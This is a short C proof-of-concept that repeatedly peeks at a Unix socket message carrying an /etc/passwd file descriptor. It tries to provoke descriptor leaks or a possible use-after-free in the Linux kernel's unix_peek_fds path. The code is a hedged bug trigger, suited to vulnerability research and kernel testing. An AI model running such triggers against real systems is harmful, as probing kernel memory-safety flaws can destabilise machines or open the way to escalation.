/*
 * PoC for WMI-3: unix_peek_fds
 * Peek multiple times to install the same fds repeatedly.
 * This leaks file descriptors and might cause use-after-free.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

int main(int argc, char *argv[])
{
    int sv[2];
    int fd_to_send;
    struct msghdr msg;
    struct iovec iov;
    char buf[64];
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    struct cmsghdr *cmsg;
    int ret;
    int i;
    int nfds;

    /* Create a socket pair (STREAM) */
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
        perror("socketpair");
        return 1;
    }

    /* Open a file to send as SCM_RIGHTS */
    fd_to_send = open("/etc/passwd", O_RDONLY);
    if (fd_to_send < 0) {
        perror("open");
        return 1;
    }

    /* Send message with SCM_RIGHTS */
    memset(&msg, 0, sizeof(msg));
    memset(buf, 0x41, sizeof(buf));
    iov.iov_base = buf;
    iov.iov_len = sizeof(buf);
    msg.msg_name = NULL;
    msg.msg_namelen = 0;
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);
    cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    *(int *)CMSG_DATA(cmsg) = fd_to_send;

    ret = sendmsg(sv[0], &msg, 0);
    if (ret < 0) {
        perror("sendmsg");
        return 1;
    }
    printf("sendmsg succeeded\n");

    /* Peek many times - each peek will trigger unix_peek_fds which dups
     * the fp list, and scm_detach_fds installs the fds.
     * This causes fd leaks and potential UAF.
     */
    nfds = 0;
    for (i = 0; i < 1000; i++) {
        memset(&msg, 0, sizeof(msg));
        memset(cmsg_buf, 0, sizeof(cmsg_buf));
        memset(buf, 0, sizeof(buf));
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);

        ret = recvmsg(sv[1], &msg, MSG_PEEK);
        if (ret < 0) {
            perror("recvmsg (peek)");
            return 1;
        }

        /* Extract received fd */
        cmsg = CMSG_FIRSTHDR(&msg);
        if (cmsg && cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_RIGHTS) {
            int received_fd = *(int *)CMSG_DATA(cmsg);
            if (received_fd >= 0) {
                /* We got a new fd. Close it to not exhaust limit */
                close(received_fd);
                nfds++;
            }
        }
    }
    printf("Peeked %d times, got %d fds\n", i, nfds);

    close(fd_to_send);
    close(sv[0]);
    close(sv[1]);

    printf("PoC completed\n");
    return 0;
}
